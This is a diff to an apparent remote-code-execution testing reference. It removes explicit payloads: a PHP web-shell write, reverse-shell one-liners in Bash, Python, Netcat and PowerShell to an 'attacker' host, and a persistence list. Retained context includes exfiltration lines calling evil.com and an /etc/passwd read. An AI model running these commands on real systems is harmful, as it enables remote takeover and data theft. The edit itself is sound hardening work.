@@ -59,7 +59,7 @@ ${IFS}id
 
 <language_specific_rce>
 <php>
-- eval($_GET['cmd'])
+- eval() with user input
 - system(), exec(), shell_exec(), passthru()
 - preg_replace with /e modifier
 - assert() with string input
@@ -101,7 +101,7 @@ Works in multiple contexts:
 - DNS exfiltration: $(whoami).evil.com
 - HTTP callbacks: curl evil.com/$(id)
 - Time delays for boolean extraction
-- Write to web root: echo '<?php system($_GET["cmd"]); ?>' > /var/www/shell.php
+- Write to web root
 </blind_rce>
 
 <chained_exploitation>
@@ -162,22 +162,6 @@ concat:|file:///etc/passwd
 - Alternative commands: hostname vs uname -n
 - Path traversal: /usr/bin/id vs id
 </waf_bypasses>
-
-<post_exploitation>
-<reverse_shells>
-Bash: bash -i >& /dev/tcp/attacker/4444 0>&1
-Python: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
-Netcat: nc -e /bin/sh attacker 4444
-PowerShell: $client = New-Object System.Net.Sockets.TCPClient("attacker",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-</reverse_shells>
-
-<persistence>
-- Cron jobs
-- SSH keys
-- Web shells
-- Systemd services
-</persistence>
-</post_exploitation>
 
 <validation>
 To confirm RCE:
